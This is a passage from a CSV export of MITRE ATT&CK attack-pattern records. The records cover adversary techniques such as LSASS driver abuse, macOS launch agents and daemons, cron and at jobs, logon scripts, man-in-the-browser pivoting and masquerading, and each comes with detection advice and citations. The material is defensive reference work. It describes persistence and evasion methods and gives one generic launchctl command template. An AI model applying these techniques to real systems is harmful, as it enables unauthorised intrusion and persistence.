Contributors: Matthew Demaske, Adaptforward","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1171', 'external_id': 'T1171'}, {'source_name': 'Wikipedia LLMNR', 'description': 'Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution. Retrieved November 17, 2017.', 'url': 'https://en.wikipedia.org/wiki/Link-Local%20Multicast%20Name%20Resolution'}, {'source_name': 'TechNet NetBIOS', 'description': 'Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November 17, 2017.', 'url': 'https://technet.microsoft.com/library/cc958811.aspx'}, {'source_name': 'GitHub NBNSpoof', 'description': 'Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.', 'url': 'https://github.com/nomex/nbnspoof'}, {'source_name': 'Rapid7 LLMNR Spoofer', 'description': 'Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.', 'url': 'https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr%20response'}, {'source_name': 'GitHub Responder', 'description': 'Gaffie, L. (2016, August 25). Responder. Retrieved November 17, 2017.', 'url': 'https://github.com/SpiderLabs/Responder'}, {'source_name': 'Sternsecurity LLMNR-NBTNS', 'description': 'Sternstein, J. (2013, November). Local Network Attacks: LLMNR and NBT-NS Poisoning. Retrieved November 17, 2017.', 'url': 'https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning'}, {'source_name': 'GitHub Conveigh', 'description': 'Robertson, K. (2016, August 28). Conveigh. Retrieved November 17, 2017.', 'url': 'https://github.com/Kevin-Robertson/Conveigh'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'Packet capture', 'Netflow/Enclave netflow']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Matthew Demaske, Adaptforward']","","","","",""
"attack-pattern","attack-pattern--6e6845c2-347a-4a6f-a2d1-b74a18ebd352","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","LSASS Driver","The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.  (Citation: Microsoft Security Subsystem)

Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., DLL Side-Loading or DLL Search Order Hijacking), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.

Detection: With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014)

Utilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA.

Utilize the Sysinternals Process Monitor utility to monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)

Platforms: Windows

Data Sources: API monitoring, DLL monitoring, File monitoring, Kernel drivers, Loaded DLLs, Process Monitoring

Permissions Required: Administrator, SYSTEM

Remote Support: No

Contributors: Vincent Le Toux","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1177', 'external_id': 'T1177'}, {'source_name': 'Microsoft Security Subsystem', 'description': 'Microsoft. (n.d.). Security Subsystem Architecture. Retrieved November 27, 2017.', 'url': 'https://technet.microsoft.com/library/cc961760.aspx'}, {'source_name': 'Microsoft LSA Protection Mar 2014', 'description': 'Microsoft. (2014, March 12). Configuring Additional LSA Protection. Retrieved November 27, 2017.', 'url': 'https://technet.microsoft.com/library/dn408187.aspx'}, {'source_name': 'Microsoft DLL Security', 'description': 'Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November 27, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx'}, {'source_name': 'TechNet Autoruns', 'description': 'Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.', 'url': 'https://technet.microsoft.com/en-us/sysinternals/bb963902'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'DLL monitoring', 'File monitoring', 'Kernel drivers', 'Loaded DLLs', 'Process Monitoring']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Vincent Le Toux']","","","False","",""
"attack-pattern","attack-pattern--dd901512-6e37-4155-943b-453e3777b125","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Launch Agent","Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in `/System/Library/LaunchAgents`, `/Library/LaunchAgents`, and `$HOME/Library/LaunchAgents` (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware).  These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware).
 
Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).

Detection: Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.

Platforms: macOS

Data Sources: File monitoring, Process Monitoring

Permissions Required: User, Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1159', 'external_id': 'T1159'}, {'source_name': 'Antiquated Mac Malware', 'description': 'Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.', 'url': 'https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/'}, {'source_name': 'AppleDocs Launch Agent Daemons', 'description': 'Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.', 'url': 'https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html'}, {'source_name': 'Methods of Mac Malware Persistence', 'description': 'Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.', 'url': 'https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf'}, {'source_name': 'OSX Keydnap malware', 'description': 'Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.', 'url': 'https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/'}, {'source_name': 'OSX Malware Detection', 'description': ""Patrick Wardle. (2016, February 29). Let's Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017."", 'url': 'https://www.synack.com/wp-content/uploads/2016/03/RSA%20OSX%20Malware.pdf'}, {'source_name': 'OSX.Dok Malware', 'description': 'Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.', 'url': 'https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/'}, {'source_name': 'OceanLotus for OS X', 'description': 'Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.', 'url': 'https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update'}, {'source_name': 'Sofacy Komplex Trojan', 'description': ""Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017."", 'url': 'https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring']","['User', 'Administrator']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--e99ec083-abdd-48de-ad87-4dbf6f8ba2a4","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Launch Daemon","Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in `/System/Library/LaunchDaemons` and `/Library/LaunchDaemons` (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).
 
Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software  (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root.
 
The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.

Detection: Monitor Launch Daemon creation through additional plist files and utilities such as Objective-See's Knock Knock application.

Platforms: macOS

Data Sources: Process Monitoring, File monitoring

Effective Permissions: root

Permissions Required: Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1160', 'external_id': 'T1160'}, {'source_name': 'AppleDocs Launch Agent Daemons', 'description': 'Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.', 'url': 'https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html'}, {'source_name': 'Methods of Mac Malware Persistence', 'description': 'Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.', 'url': 'https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf'}, {'source_name': 'OSX Malware Detection', 'description': ""Patrick Wardle. (2016, February 29). Let's Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017."", 'url': 'https://www.synack.com/wp-content/uploads/2016/03/RSA%20OSX%20Malware.pdf'}, {'source_name': 'WireLurker', 'description': 'Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.', 'url': 'https://www.paloaltonetworks.com/content/dam/pan/en%20US/assets/pdf/reports/Unit%2042/unit42-wirelurker.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process Monitoring', 'File monitoring']","['Administrator']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['root']","","","",""
"attack-pattern","attack-pattern--53bfc8bf-8f76-4cd7-8958-49a884ddb3ee","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Launchctl","Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made  (Citation: Sofacy Komplex Trojan). Running a command from launchctl is as simple as `launchctl submit -l <labelName> -- /Path/to/thing/to/execute ""arg"" ""arg"" ""arg""`. Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. 

Adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.

Detection: Knock Knock can be used to detect persistent programs such as those installed via launchctl as launch agents or launch daemons. Additionally, every launch agent or launch daemon must have a corresponding plist file on disk somewhere which can be monitored. Monitor process execution from launchctl/launchd for unusual or unknown processes.

Platforms: macOS

Data Sources: File monitoring, Process Monitoring, Process command-line parameters

Defense Bypassed: Application whitelisting, Process whitelisting, Whitelisting by file name or path

Permissions Required: User, Administrator

Remote Support: No","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1152', 'external_id': 'T1152'}, {'source_name': 'Sofacy Komplex Trojan', 'description': ""Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy's 'Komplex' OS X Trojan. Retrieved July 8, 2017."", 'url': 'https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring', 'Process command-line parameters']","['User', 'Administrator']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","False","","['Application whitelisting', 'Process whitelisting', 'Whitelisting by file name or path']"
"attack-pattern","attack-pattern--c0a384a4-9a25-40e1-97b6-458388474bc8","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Local Job Scheduling","On Linux and Apple systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike Scheduled Task on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

===cron===

System-wide cron jobs are installed by modifying `/etc/crontab` file, `/etc/cron.d/` directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on Mac and Linux systems.

Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

===at===

The at program is another means on Linux-based systems, including Mac, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

===launchd===

Each launchd job is described by a different configuration property list (plist) file similar to Launch Daemon or Launch Agent, except there is an additional key called `StartCalendarInterval` with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.

Detection: Legitimate scheduled jobs may be created during installation of new software or through administration functions. Jobs scheduled with launchd and cron can be monitored from their respective utilities to list out detailed information about the jobs. Monitor process execution resulting from launchd and cron tasks to look for unusual or unknown applications and behavior.

Platforms: Linux, macOS

Data Sources: File monitoring, Process Monitoring

Permissions Required: Administrator, User, root

Contributors: Anastasios Pingios","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1168', 'external_id': 'T1168'}, {'source_name': 'AppleDocs Scheduling Timed Jobs', 'description': 'Apple. (n.d.).  Retrieved July 17, 2017.', 'url': 'https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/ScheduledJobs.html'}, {'source_name': 'Janicab', 'description': 'Thomas. (2013, July 15). New signed malware called Janicab. Retrieved July 17, 2017.', 'url': 'http://www.thesafemac.com/new-signed-malware-called-janicab/'}, {'source_name': 'Methods of Mac Malware Persistence', 'description': 'Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.', 'url': 'https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf'}, {'source_name': 'Malware Persistence on OS X', 'description': 'Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.', 'url': 'https://www.rsaconference.com/writable/presentations/file%20upload/ht-r03-malware-persistence-on-os-x-yosemite%20final.pdf'}, {'source_name': 'Die.net Linux crontab Man Page', 'description': 'Paul Vixie. (n.d.). crontab(5) - Linux man page. Retrieved December 19, 2017.', 'url': 'https://linux.die.net/man/5/crontab'}, {'source_name': 'Die.net Linux at Man Page', 'description': 'Thomas Koenig. (n.d.). at(1) - Linux man page. Retrieved December 19, 2017.', 'url': 'https://linux.die.net/man/1/at'}, {'source_name': 'Avast Linux Trojan Cron Persistence', 'description': 'Threat Intelligence Team. (2015, January 6). Linux DDoS Trojan hiding itself with an embedded rootkit. Retrieved January 8, 2018.', 'url': 'https://blog.avast.com/2015/01/06/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process Monitoring']","['Administrator', 'User', 'root']","['Linux', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Anastasios Pingios']","","","","",""
"attack-pattern","attack-pattern--36675cd3-fe00-454c-8516-aebecacbe9d9","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Login Item","MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them (Citation: Adding Login Items). Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). These login items are stored in the user's `~/Library/Preferences/` directory in a plist file called `com.apple.loginitems.plist` (Citation: Methods of Mac Malware Persistence). Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to ‘Hide’ the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware).

Detection: All the login items are viewable by going to the Apple menu -> System Preferences -> Users & Groups -> Login items. This area should be monitored and whitelisted for known good applications. Monitor process execution resulting from login actions for unusual or unknown applications.

Platforms: macOS

Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1162', 'external_id': 'T1162'}, {'source_name': 'Adding Login Items', 'description': 'Apple. (2016, September 13). Adding Login Items. Retrieved July 11, 2017.', 'url': 'https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html'}, {'source_name': 'Methods of Mac Malware Persistence', 'description': 'Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.', 'url': 'https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf'}, {'source_name': 'Malware Persistence on OS X', 'description': 'Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.', 'url': 'https://www.rsaconference.com/writable/presentations/file%20upload/ht-r03-malware-persistence-on-os-x-yosemite%20final.pdf'}, {'source_name': 'OSX.Dok Malware', 'description': 'Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.', 'url': 'https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","","['User']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334","2017-05-31T21:30:38.910Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Logon Scripts","===Windows===

Windows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.

If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.

===Mac===

Mac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.

Detection: Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties.

Platforms: macOS, Windows

Data Sources: File monitoring, Process monitoring

System Requirements: Write access to system or domain logon scripts","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1037', 'external_id': 'T1037'}, {'source_name': 'TechNet Logon Scripts', 'description': 'Microsoft. (2005, January 21). Creating logon scripts. Retrieved April 27, 2016.', 'url': 'https://technet.microsoft.com/en-us/library/cc758918(v=ws.10).aspx'}, {'source_name': 'creating login hook', 'description': 'Apple. (2011, June 1). Mac OS X: Creating a login hook. Retrieved July 17, 2017.', 'url': 'https://support.apple.com/de-at/HT2420'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring']","","['macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Write access to system or domain logon scripts']","","",""
"attack-pattern","attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Man in the Browser","Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. (Citation: Wikipedia Man in the Browser)

A specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet. (Citation: Cobalt Strike Browser Pivot)

Browser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication (Citation: cobaltstrike manual).

Detection: This is a difficult technique to detect because adversary traffic would be masked by normal user traffic. No new processes are created and no additional software touches disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for process injection against browser applications

Platforms: Windows

Data Sources: Authentication logs, Packet capture, Process Monitoring, API monitoring

Permissions Required: Administrator, SYSTEM

Contributors: Justin Warner, ICEBRG","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1185', 'external_id': 'T1185'}, {'source_name': 'Wikipedia Man in the Browser', 'description': 'Wikipedia. (2017, October 28). Man-in-the-browser. Retrieved January 10, 2018.', 'url': 'https://en.wikipedia.org/wiki/Man-in-the-browser'}, {'source_name': 'Cobalt Strike Browser Pivot', 'description': 'Mudge, R. (n.d.). Browser Pivoting. Retrieved January 10, 2018.', 'url': 'https://www.cobaltstrike.com/help-browser-pivoting'}, {'source_name': 'cobaltstrike manual', 'description': 'Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual. Retrieved May 24, 2017.', 'url': 'https://cobaltstrike.com/downloads/csmanual38.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs', 'Packet capture', 'Process Monitoring', 'API monitoring']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Justin Warner, ICEBRG']","","","","",""
"attack-pattern","attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0","2017-05-31T21:30:38.511Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Masquerading","Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.  Several different variations of this technique have been observed.

One variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program.  Alternatively, the filename given may be a close approximation of legitimate programs.  This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.


===Windows===
In another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)

An example of abuse of trusted locations in Windows would be the `C:\Windows\System32` directory.  Examples of trusted binary names that can be given to malicious binares include ""explorer.exe"" and ""svchost.exe"".

===Linux===
Another variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before.  (Citation: Remaiten)

An example of abuse of trusted locations in Linux  would be the `/bin` directory.  Examples of trusted binary names that can be given to malicious binares include ""rsyncd"" and ""dbus-inotifier"".   (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)

Detection: Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.

If file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball)

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Binary file metadata

Defense Bypassed: Whitelisting by file name or path

Contributors: ENDGAME, Bartosz Jerzman","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1036', 'external_id': 'T1036'}, {'source_name': 'Endgame Masquerade Ball', 'description': 'Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.', 'url': 'https://www.endgame.com/blog/how-hunt-masquerade-ball'}, {'source_name': 'F-Secure CozyDuke', 'description': 'F-Secure Labs. (2015, April 22). CozyDuke: Malware Analysis. Retrieved December 10, 2015.', 'url': 'https://www.f-secure.com/documents/996508/1030745/CozyDuke'}, {'source_name': 'Remaiten', 'description': 'Michal Malik AND Marc-Etienne M.Léveillé. (2016, March 30). Meet Remaiten – a Linux bot on steroids targeting routers and potentially other IoT devices. Retrieved September 7, 2017.', 'url': 'https://www.welivesecurity.com/2016/03/30/meet-remaiten-a-linux-bot-on-steroids-targeting-routers-and-potentially-other-iot-devices/'}, {'source_name': 'Fysbis Palo Alto Analysis', 'description': 'Bryan Lee and Rob Downs. (2016, February 12). A Look Into Fysbis: Sofacy’s Linux Backdoor. Retrieved September 10, 2017.', 'url': 'https://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/'}, {'source_name': 'Fysbis Dr Web Analysis', 'description': 'Doctor Web. (2014, November 21). Linux.BackDoor.Fysbis.1. Retrieved December 7, 2017.', 'url': 'https://vms.drweb.com/virus/?i=4276269'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process monitoring', 'Binary file metadata']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['ENDGAME', 'Bartosz Jerzman']","","","","","['Whitelisting by file name or path']"
"attack-pattern","attack-pattern--62dfd1ca-52d5-483c-a84b-d6e80bf94b7b","2017-05-31T21:30:34.928Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Modify Existing Service","Windows service configuration information, including the file path to the service's executable, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and Reg.

Adversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of Masquerading that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.

Detection: Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence. (Citation: TechNet Autoruns) 

Service information is stored in the Registry at `HKLM\SYSTEM\CurrentControlSet\Services`.

